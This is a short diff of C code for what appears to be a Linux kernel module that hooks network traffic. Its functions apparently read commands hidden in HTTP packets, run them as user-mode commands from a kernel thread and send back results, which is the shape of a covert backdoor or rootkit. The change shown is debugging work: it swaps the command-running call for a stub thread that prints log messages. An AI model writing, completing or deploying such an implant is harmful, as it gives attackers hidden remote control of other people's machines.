@@ -55,6 +55,15 @@ typedef struct _result_msg{
 	int len;
 }result_msg;
 
+
+typedef struct _run_cmd_args{
+	char * arg;
+	unsigned int arg_len;	
+}run_cmd_args;
+
+static int run_usermode_cmd( void *arguments);
+
+
 result_msg * global_result_msg = NULL;
 
 char result_ready = 0;
@@ -204,10 +213,6 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
 	return NF_ACCEPT;
 }
 
-typedef struct _run_cmd_args{
-	char * arg;
-	unsigned int arg_len;	
-}run_cmd_args;
 
 static int run_usermode_cmd( void *arguments)
 {
@@ -258,6 +263,18 @@ exit_thread:
 	do_exit(0);
 }
 
+
+static void simple( void *arguments)
+{
+	// run_cmd_args * a = (run_cmd_args*)arguments;
+	// if (a)
+	// 	printk("arg_len = %d.", a->arg_len);
+	
+	printk("[+] Colman: Simple thread\n");
+	//kthread_should_stop();
+	kthread_exit();
+	//do_exit(0);
+}
 
 unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
 {
@@ -366,16 +383,17 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 
 				//printk("arg: %s", command);
 				
-				cmd_arguments.arg_len = 0;
+				//cmd_arguments.arg_len = 0;
+				//run_cmd_args * a = (run_cmd_args *)kmalloc(sizeof(run_cmd_args), GFP_ATOMIC);
+				//a->arg_len = 112;
+				thread1 = kthread_run(simple, NULL, "thread");
 
 				if (thread1)
 				{
 					printk("[?] Colman: HERE!!");
 					return NF_ACCEPT;
 				}
-
-				//thread1 = kthread_run(run_usermode_cmd, &cmd_arguments, "thread");
-
+				
 				set_result_msg("file:output", strlen("file:output"));
 				break;
 			//read to see ok->
